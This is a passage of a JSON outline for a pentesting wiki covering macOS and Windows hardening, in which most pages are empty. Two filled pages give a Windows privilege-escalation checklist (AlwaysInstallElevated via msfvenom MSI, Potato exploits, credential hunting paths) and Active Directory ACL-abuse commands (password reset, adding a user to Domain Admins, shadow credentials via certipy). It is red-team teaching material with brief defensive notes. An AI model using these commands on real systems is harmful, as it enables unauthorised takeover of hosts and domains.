   "title": "🍏 MacOS Hardening",
   "slug": "macos-hardening",
   "type": "category",
   "children": [
    {
     "title": "macOS Security & Privilege Escalation",
     "slug": "macos-security-privilege-escalation",
     "type": "page",
     "children": [
      {
       "title": "macOS Apps - Inspecting, debugging and Fuzzing",
       "slug": "macos-apps---inspecting-debugging-and-fuzzing",
       "type": "page",
       "children": [
        {
         "title": "Objects in memory",
         "slug": "objects-in-memory",
         "type": "page",
         "children": [],
         "tag": "TAG-0170",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Introduction to x64",
         "slug": "introduction-to-x64",
         "type": "page",
         "children": [],
         "tag": "TAG-0171",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Introduction to ARM64v8",
         "slug": "introduction-to-arm64v8",
         "type": "page",
         "children": [],
         "tag": "TAG-0172",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0169",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS AppleFS",
       "slug": "macos-applefs",
       "type": "page",
       "children": [],
       "tag": "TAG-0173",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Bypassing Firewalls",
       "slug": "macos-bypassing-firewalls",
       "type": "page",
       "children": [],
       "tag": "TAG-0174",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Defensive Apps",
       "slug": "macos-defensive-apps",
       "type": "page",
       "children": [],
       "tag": "TAG-0175",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Macos Dyld Hijacking And Dyld Insert Libraries",
       "slug": "macos-dyld-hijacking-and-dyld-insert-libraries",
       "type": "page",
       "children": [],
       "tag": "TAG-0176",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS GCD - Grand Central Dispatch",
       "slug": "macos-gcd---grand-central-dispatch",
       "type": "page",
       "children": [],
       "tag": "TAG-0177",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Kernel & System Extensions",
       "slug": "macos-kernel-system-extensions",
       "type": "page",
       "children": [
        {
         "title": "macOS IOKit",
         "slug": "macos-iokit",
         "type": "page",
         "children": [],
         "tag": "TAG-0179",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Kernel Extensions & Kernelcache",
         "slug": "macos-kernel-extensions-kernelcache",
         "type": "page",
         "children": [],
         "tag": "TAG-0180",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Kernel Vulnerabilities",
         "slug": "macos-kernel-vulnerabilities",
         "type": "page",
         "children": [],
         "tag": "TAG-0181",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS System Extensions",
         "slug": "macos-system-extensions",
         "type": "page",
         "children": [],
         "tag": "TAG-0182",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS NVRAM",
         "slug": "macos-nvram",
         "type": "page",
         "children": [],
         "tag": "TAG-0183",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0178",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Network Services & Protocols",
       "slug": "macos-network-services-protocols",
       "type": "page",
       "children": [],
       "tag": "TAG-0184",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS File Extension & URL scheme app handlers",
       "slug": "macos-file-extension-url-scheme-app-handlers",
       "type": "page",
       "children": [],
       "tag": "TAG-0185",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Files, Folders, Binaries & Memory",
       "slug": "macos-files-folders-binaries-memory",
       "type": "page",
       "children": [
        {
         "title": "macOS Bundles",
         "slug": "macos-bundles",
         "type": "page",
         "children": [],
         "tag": "TAG-0187",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Installers Abuse",
         "slug": "macos-installers-abuse",
         "type": "page",
         "children": [],
         "tag": "TAG-0188",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Memory Dumping",
         "slug": "macos-memory-dumping",
         "type": "page",
         "children": [],
         "tag": "TAG-0189",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Sensitive Locations & Interesting Daemons",
         "slug": "macos-sensitive-locations-interesting-daemons",
         "type": "page",
         "children": [],
         "tag": "TAG-0190",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Universal binaries & Mach-O Format",
         "slug": "macos-universal-binaries-mach-o-format",
         "type": "page",
         "children": [],
         "tag": "TAG-0191",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0186",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Objective-C",
       "slug": "macos-objective-c",
       "type": "page",
       "children": [],
       "tag": "TAG-0192",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Privilege Escalation",
       "slug": "macos-privilege-escalation",
       "type": "page",
       "children": [],
       "tag": "TAG-0193",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Process Abuse",
       "slug": "macos-process-abuse",
       "type": "page",
       "children": [
        {
         "title": "macOS Dirty NIB",
         "slug": "macos-dirty-nib",
         "type": "page",
         "children": [],
         "tag": "TAG-0195",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Chromium Injection",
         "slug": "macos-chromium-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0196",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Electron Applications Injection",
         "slug": "macos-electron-applications-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0197",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Function Hooking",
         "slug": "macos-function-hooking",
         "type": "page",
         "children": [],
         "tag": "TAG-0198",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS IPC - Inter Process Communication",
         "slug": "macos-ipc---inter-process-communication",
         "type": "page",
         "children": [
          {
           "title": "macOS MIG - Mach Interface Generator",
           "slug": "macos-mig---mach-interface-generator",
           "type": "page",
           "children": [],
           "tag": "TAG-0200",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS XPC",
           "slug": "macos-xpc",
           "type": "page",
           "children": [
            {
             "title": "macOS XPC Authorization",
             "slug": "macos-xpc-authorization",
             "type": "page",
             "children": [],
             "tag": "TAG-0202",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "macOS XPC Connecting Process Check",
             "slug": "macos-xpc-connecting-process-check",
             "type": "page",
             "children": [
              {
               "title": "macOS PID Reuse",
               "slug": "macos-pid-reuse",
               "type": "page",
               "children": [],
               "tag": "TAG-0204",
               "content": "",
               "status": "empty",
               "updated": null
              },
              {
               "title": "macOS xpc_connection_get_audit_token Attack",
               "slug": "macos-xpcconnectiongetaudittoken-attack",
               "type": "page",
               "children": [],
               "tag": "TAG-0205",
               "content": "",
               "status": "empty",
               "updated": null
              }
             ],
             "tag": "TAG-0203",
             "content": "",
             "status": "empty",
             "updated": null
            }
           ],
           "tag": "TAG-0201",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS Thread Injection via Task port",
           "slug": "macos-thread-injection-via-task-port",
           "type": "page",
           "children": [],
           "tag": "TAG-0206",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0199",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Java Applications Injection",
         "slug": "macos-java-applications-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0207",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Library Injection",
         "slug": "macos-library-injection",
         "type": "page",
         "children": [
          {
           "title": "macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES",
           "slug": "macos-dyld-hijacking-dyldinsertlibraries",
           "type": "page",
           "children": [],
           "tag": "TAG-0209",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS Dyld Process",
           "slug": "macos-dyld-process",
           "type": "page",
           "children": [],
           "tag": "TAG-0210",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0208",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Perl Applications Injection",
         "slug": "macos-perl-applications-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0211",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Python Applications Injection",
         "slug": "macos-python-applications-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0212",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Ruby Applications Injection",
         "slug": "macos-ruby-applications-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0213",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS .Net Applications Injection",
         "slug": "macos-net-applications-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0214",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Quick Look Generators",
         "slug": "macos-quick-look-generators",
         "type": "page",
         "children": [],
         "tag": "TAG-0215",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Automator, Preference Panes & NSServices",
         "slug": "macos-automator-preference-panes-nsservices",
         "type": "page",
         "children": [],
         "tag": "TAG-0216",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS XPC Mach Services Abuse",
         "slug": "macos-xpc-mach-services-abuse",
         "type": "page",
         "children": [],
         "tag": "TAG-0217",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0194",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Security Protections",
       "slug": "macos-security-protections",
       "type": "page",
       "children": [
        {
         "title": "macOS Gatekeeper / Quarantine / XProtect",
         "slug": "macos-gatekeeper-quarantine-xprotect",
         "type": "page",
         "children": [],
         "tag": "TAG-0219",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Launch/Environment Constraints & Trust Cache",
         "slug": "macos-launchenvironment-constraints-trust-cache",
         "type": "page",
         "children": [],
         "tag": "TAG-0220",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Sandbox",
         "slug": "macos-sandbox",
         "type": "page",
         "children": [
          {
           "title": "macOS Default Sandbox Debug",
           "slug": "macos-default-sandbox-debug",
           "type": "page",
           "children": [],
           "tag": "TAG-0222",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS Sandbox Debug & Bypass",
           "slug": "macos-sandbox-debug-bypass",
           "type": "page",
           "children": [
            {
             "title": "macOS Office Sandbox Bypasses",
             "slug": "macos-office-sandbox-bypasses",
             "type": "page",
             "children": [],
             "tag": "TAG-0224",
             "content": "",
             "status": "empty",
             "updated": null
            }
           ],
           "tag": "TAG-0223",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0221",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Authorizations DB & Authd",
         "slug": "macos-authorizations-db-authd",
         "type": "page",
         "children": [],
         "tag": "TAG-0225",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS SIP",
         "slug": "macos-sip",
         "type": "page",
         "children": [],
         "tag": "TAG-0226",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS TCC",
         "slug": "macos-tcc",
         "type": "page",
         "children": [
          {
           "title": "macOS Apple Events",
           "slug": "macos-apple-events",
           "type": "page",
           "children": [],
           "tag": "TAG-0228",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS TCC Bypasses",
           "slug": "macos-tcc-bypasses",
           "type": "page",
           "children": [
            {
             "title": "macOS Apple Scripts",
             "slug": "macos-apple-scripts",
             "type": "page",
             "children": [],
             "tag": "TAG-0230",
             "content": "",
             "status": "empty",
             "updated": null
            }
           ],
           "tag": "TAG-0229",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS TCC Payloads",
           "slug": "macos-tcc-payloads",
           "type": "page",
           "children": [],
           "tag": "TAG-0231",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "macOS TCC Credential & Data Theft",
           "slug": "macos-tcc-credential-data-theft",
           "type": "page",
           "children": [],
           "tag": "TAG-0232",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0227",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Dangerous Entitlements & TCC perms",
         "slug": "macos-dangerous-entitlements-tcc-perms",
         "type": "page",
         "children": [],
         "tag": "TAG-0233",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS - AMFI - AppleMobileFileIntegrity",
         "slug": "macos---amfi---applemobilefileintegrity",
         "type": "page",
         "children": [],
         "tag": "TAG-0234",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS MACF - Mandatory Access Control Framework",
         "slug": "macos-macf---mandatory-access-control-framework",
         "type": "page",
         "children": [],
         "tag": "TAG-0235",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Code Signing",
         "slug": "macos-code-signing",
         "type": "page",
         "children": [],
         "tag": "TAG-0236",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Code Signing Weaknesses & Sandbox Escapes",
         "slug": "macos-code-signing-weaknesses-sandbox-escapes",
         "type": "page",
         "children": [],
         "tag": "TAG-0237",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Sealed System Volume & DataVault",
         "slug": "macos-sealed-system-volume-datavault",
         "type": "page",
         "children": [],
         "tag": "TAG-0238",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Input Monitoring, Screen Capture & Accessibility",
         "slug": "macos-input-monitoring-screen-capture-accessibility",
         "type": "page",
         "children": [],
         "tag": "TAG-0239",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS FS Tricks",
         "slug": "macos-fs-tricks",
         "type": "page",
         "children": [
          {
           "title": "macOS xattr-acls extra stuff",
           "slug": "macos-xattr-acls-extra-stuff",
           "type": "page",
           "children": [],
           "tag": "TAG-0241",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0240",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0218",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Users & External Accounts",
       "slug": "macos-users-external-accounts",
       "type": "page",
       "children": [],
       "tag": "TAG-0242",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0168",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "macOS Red Teaming",
     "slug": "macos-red-teaming",
     "type": "page",
     "children": [
      {
       "title": "macOS MDM",
       "slug": "macos-mdm",
       "type": "page",
       "children": [
        {
         "title": "Enrolling Devices in Other Organisations",
         "slug": "enrolling-devices-in-other-organisations",
         "type": "page",
         "children": [],
         "tag": "TAG-0245",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "macOS Serial Number",
         "slug": "macos-serial-number",
         "type": "page",
         "children": [],
         "tag": "TAG-0246",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0244",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "macOS Keychain",
       "slug": "macos-keychain",
       "type": "page",
       "children": [],
       "tag": "TAG-0247",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0243",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "macOS Useful Commands",
     "slug": "macos-useful-commands",
     "type": "page",
     "children": [],
     "tag": "TAG-0248",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "macOS Auto Start",
     "slug": "macos-auto-start",
     "type": "page",
     "children": [],
     "tag": "TAG-0249",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#9AA5B1"
  },
  {
   "title": "🪟 Windows Hardening",
   "slug": "windows-hardening",
   "type": "category",
   "children": [
    {
     "title": "Authentication Credentials Uac And Efs",
     "slug": "authentication-credentials-uac-and-efs",
     "type": "page",
     "children": [],
     "tag": "TAG-0250",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Checklist - Local Windows Privilege Escalation",
     "slug": "checklist---local-windows-privilege-escalation",
     "type": "page",
     "children": [],
     "tag": "TAG-0251",
     "content": "# Windows Privilege Escalation Checklist\n\n## System Info\n```powershell\nsysteminfo\nwhoami /priv                    # look for SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege\nwhoami /groups\n```\n\n## Automated Enumeration\n```powershell\nwinPEAS.exe\nInvoke-PrivescCheck            # PowerShell module\n```\n\n## Manual Checks\n- [ ] Dangerous privileges in `whoami /priv` (`SeImpersonatePrivilege` → Potato-family exploits; `SeBackupPrivilege` → read SAM/registry directly)\n- [ ] Unquoted service paths: `wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"`\n- [ ] Weak service permissions (can you reconfigure a service binary path?): `accesschk.exe -uwcqv \"Authenticated Users\" *`\n- [ ] AlwaysInstallElevated registry keys set (both HKLM and HKCU) → arbitrary MSI runs as SYSTEM\n- [ ] Scheduled tasks running as SYSTEM pointing to a writable script/binary\n- [ ] Stored credentials: `cmdkey /list`, browser saved passwords, `unattend.xml` leftovers, PowerShell history\n- [ ] DPAPI-protected secrets you can decrypt with the current user's context\n- [ ] Registry autoruns writable by current user\n- [ ] Token impersonation opportunities via named pipes if you have `SeImpersonatePrivilege`\n\n## Quick Wins Table\n| Finding | Exploit approach |\n|---|---|\n| `SeImpersonatePrivilege` enabled | PrintSpoofer / GodPotato / RoguePotato → SYSTEM shell |\n| AlwaysInstallElevated = 1 (both hives) | Build malicious MSI with `msfvenom -f msi`, run it |\n| Unquoted path + writable directory | Drop malicious `.exe` in the writable segment of the path |\n| Service binary replaceable | Swap binary for a payload, restart service |\n| `SeBackupPrivilege` | Use `robocopy /b` to read protected SAM/SYSTEM hives directly |\n\n## Credential Hunting Locations\n- `C:\\Windows\\Panther\\Unattend.xml` and `sysprep.inf`\n- PowerShell history: `(Get-PSReadlineOption).HistorySavePath`\n- IIS `web.config` files for connection strings\n- Group Policy Preferences (`SYSVOL\\...\\Groups.xml`) — historically stored a reversible-encrypted password",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Windows Local Privilege Escalation",
     "slug": "windows-local-privilege-escalation",
     "type": "page",
     "children": [
      {
       "title": "Abusing Auto Updaters And Ipc",
       "slug": "abusing-auto-updaters-and-ipc",
       "type": "page",
       "children": [],
       "tag": "TAG-0253",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Arbitrary Kernel Rw Token Theft",
       "slug": "arbitrary-kernel-rw-token-theft",
       "type": "page",
       "children": [],
       "tag": "TAG-0254",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Kernel Race Condition Object Manager Slowdown",
       "slug": "kernel-race-condition-object-manager-slowdown",
       "type": "page",
       "children": [],
       "tag": "TAG-0255",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Notepad Plus Plus Plugin Autoload Persistence",
       "slug": "notepad-plus-plus-plugin-autoload-persistence",
       "type": "page",
       "children": [],
       "tag": "TAG-0256",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Abusing Tokens",
       "slug": "abusing-tokens",
       "type": "page",
       "children": [],
       "tag": "TAG-0257",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Access Tokens",
       "slug": "access-tokens",
       "type": "page",
       "children": [],
       "tag": "TAG-0258",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ACLs - DACLs/SACLs/ACEs",
       "slug": "acls---daclssaclsaces",
       "type": "page",
       "children": [],
       "tag": "TAG-0259",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AppendData/AddSubdirectory permission over service registry",
       "slug": "appenddataaddsubdirectory-permission-over-service-registry",
       "type": "page",
       "children": [],
       "tag": "TAG-0260",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Create MSI with WIX",
       "slug": "create-msi-with-wix",
       "type": "page",
       "children": [],
       "tag": "TAG-0261",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "COM Hijacking",
       "slug": "com-hijacking",
       "type": "page",
       "children": [],
       "tag": "TAG-0262",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Dll Hijacking",
       "slug": "dll-hijacking",
       "type": "page",
       "children": [
        {
         "title": "Advanced Html Staged Dll Sideloading",
         "slug": "advanced-html-staged-dll-sideloading",
         "type": "page",
         "children": [],
         "tag": "TAG-0264",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Writable Sys Path +Dll Hijacking Privesc",
         "slug": "writable-sys-path-dll-hijacking-privesc",
         "type": "page",
         "children": [],
         "tag": "TAG-0265",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0263",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DPAPI - Extracting Passwords",
       "slug": "dpapi---extracting-passwords",
       "type": "page",
       "children": [],
       "tag": "TAG-0266",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "From High Integrity to SYSTEM with Name Pipes",
       "slug": "from-high-integrity-to-system-with-name-pipes",
       "type": "page",
       "children": [],
       "tag": "TAG-0267",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Integrity Levels",
       "slug": "integrity-levels",
       "type": "page",
       "children": [],
       "tag": "TAG-0268",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JuicyPotato",
       "slug": "juicypotato",
       "type": "page",
       "children": [],
       "tag": "TAG-0269",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Leaked Handle Exploitation",
       "slug": "leaked-handle-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0270",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Local NTLM Reflection via SMB Arbitrary Port",
       "slug": "local-ntlm-reflection-via-smb-arbitrary-port",
       "type": "page",
       "children": [],
       "tag": "TAG-0271",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "MSI Wrapper",
       "slug": "msi-wrapper",
       "type": "page",
       "children": [],
       "tag": "TAG-0272",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Named Pipe Client Impersonation",
       "slug": "named-pipe-client-impersonation",
       "type": "page",
       "children": [],
       "tag": "TAG-0273",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Privilege Escalation with Autoruns",
       "slug": "privilege-escalation-with-autoruns",
       "type": "page",
       "children": [],
       "tag": "TAG-0274",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato",
       "slug": "roguepotato-printspoofer-sharpefspotato-godpotato",
       "type": "page",
       "children": [],
       "tag": "TAG-0275",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SeDebug + SeImpersonate copy token",
       "slug": "sedebug-seimpersonate-copy-token",
       "type": "page",
       "children": [],
       "tag": "TAG-0276",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SeImpersonate from High To System",
       "slug": "seimpersonate-from-high-to-system",
       "type": "page",
       "children": [],
       "tag": "TAG-0277",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Semanagevolume Perform Volume Maintenance Tasks",
       "slug": "semanagevolume-perform-volume-maintenance-tasks",
       "type": "page",
       "children": [],
       "tag": "TAG-0278",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Service Triggers",
       "slug": "service-triggers",
       "type": "page",
       "children": [],
       "tag": "TAG-0279",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Telephony Tapsrv Arbitrary Dword Write To Rce",
       "slug": "telephony-tapsrv-arbitrary-dword-write-to-rce",
       "type": "page",
       "children": [],
       "tag": "TAG-0280",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Secure Desktop Accessibility Registry Propagation LPE (RegPwn)",
       "slug": "secure-desktop-accessibility-registry-propagation-lpe-regpwn",
       "type": "page",
       "children": [],
       "tag": "TAG-0281",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Uiaccess Admin Protection Bypass",
       "slug": "uiaccess-admin-protection-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0282",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Windows C Payloads",
       "slug": "windows-c-payloads",
       "type": "page",
       "children": [],
       "tag": "TAG-0283",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0252",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Active Directory Methodology",
     "slug": "active-directory-methodology",
     "type": "page",
     "children": [
      {
       "title": "Abusing Active Directory ACLs/ACEs",
       "slug": "abusing-active-directory-aclsaces",
       "type": "page",
       "children": [
        {
         "title": "BadSuccessor",
         "slug": "badsuccessor",
         "type": "page",
         "children": [],
         "tag": "TAG-0286",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Shadow Credentials",
         "slug": "shadow-credentials",
         "type": "page",
         "children": [],
         "tag": "TAG-0287",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0285",
       "content": "# Abusing Active Directory ACLs/ACEs\n\n## Concept\nEvery AD object (users, groups, GPOs, OUs, computers) has an ACL controlling who can do what to it. Over years of admin turnover and delegation, these accumulate misconfigurations — a \"helpdesk\" group given `GenericAll` over all users for password resets, then forgotten. BloodHound's entire value proposition is finding these paths automatically.\n\n## High-Value ACE Types\n| ACE | What it lets you do |\n|---|---|\n| `GenericAll` | Full control — reset password, add to group, modify anything |\n| `GenericWrite` | Modify most attributes — can be abused to write a Shadow Credential or SPN |\n| `WriteOwner` | Change the object's owner to yourself, then grant yourself further rights |\n| `WriteDACL` | Modify the object's permissions directly — grant yourself `GenericAll` |\n| `AllExtendedRights` | Includes rights like force-password-reset and DCSync (on the domain object) |\n| `AddMember` (on a group) | Add any account, including your own, into that group |\n\n## Practical Abuse Examples\n\n### GenericAll on a User → Reset Their Password\n```bash\nnet rpc password \"targetuser\" \"NewPassword123!\" -U \"domain.local\"/\"youruser\"%\"yourpass\" -S <dc-ip>\n```\n\n### GenericAll on a Group → Add Yourself\n```powershell\nAdd-DomainGroupMember -Identity \"Domain Admins\" -Members \"youruser\"\n```\n\n### WriteOwner → Take Over an Object\n```powershell\nSet-DomainObjectOwner -Identity targetobject -OwnerIdentity youruser\nAdd-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity youruser -Rights All\n```\n\n### GenericWrite on a Computer → Resource-Based Constrained Delegation\nIf you have `GenericWrite` on a computer object, you can configure RBCD to let a computer account you control impersonate any user (including Domain Admins) when authenticating to that machine.\n\n### Shadow Credentials (GenericWrite/WriteProperty on msDS-KeyCredentialLink)\nAdd an attacker-controlled certificate to the target's `msDS-KeyCredentialLink` attribute, then authenticate as that user via PKINIT — doesn't require knowing or resetting their password at all, which is much stealthier.\n```bash\ncertipy shadow auto -account targetuser -u youruser@domain.local -p yourpass\n```\n\n## Finding These Paths\n```bash\nbloodhound-python -u user -p pass -d domain.local -ns <dc-ip> -c All\n```\nIn the BloodHound GUI: mark your compromised account as \"Owned,\" then use the \"Shortest Path to Domain Admins\" query — it will highlight every ACL abuse chain automatically, including multi-hop ones a human would take much longer to spot manually.\n\n## Defensive Notes (for reports)\nRecommend a periodic ACL audit (BloodHound itself is a great free auditing tool for blue teams too), removing stale delegated permissions, and tiering admin accounts so helpdesk-level accounts never have paths to Domain Admin.",
       "status": "complete",
       "updated": "2026-07-10"
      },
      {
       "title": "AD Certificates",
       "slug": "ad-certificates",
       "type": "page",
       "children": [
        {
         "title": "AD CS Account Persistence",
         "slug": "ad-cs-account-persistence",
         "type": "page",
         "children": [],
         "tag": "TAG-0289",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "AD CS Domain Escalation",
         "slug": "ad-cs-domain-escalation",
         "type": "page",
         "children": [],
         "tag": "TAG-0290",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "AD CS Domain Persistence",
         "slug": "ad-cs-domain-persistence",
         "type": "page",
         "children": [],
         "tag": "TAG-0291",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "AD CS Certificate Theft",
         "slug": "ad-cs-certificate-theft",
         "type": "page",
         "children": [],
         "tag": "TAG-0292",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0288",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ad Certificates",
       "slug": "ad-certificates-2",
       "type": "page",
       "children": [],
       "tag": "TAG-0293",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ad Dynamic Objects Anti Forensics",
       "slug": "ad-dynamic-objects-anti-forensics",
       "type": "page",
       "children": [],
       "tag": "TAG-0294",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AD information in printers",
       "slug": "ad-information-in-printers",
       "type": "page",
       "children": [],
       "tag": "TAG-0295",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AD DNS Records",
       "slug": "ad-dns-records",
       "type": "page",
       "children": [],
       "tag": "TAG-0296",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Adws Enumeration",
       "slug": "adws-enumeration",
       "type": "page",
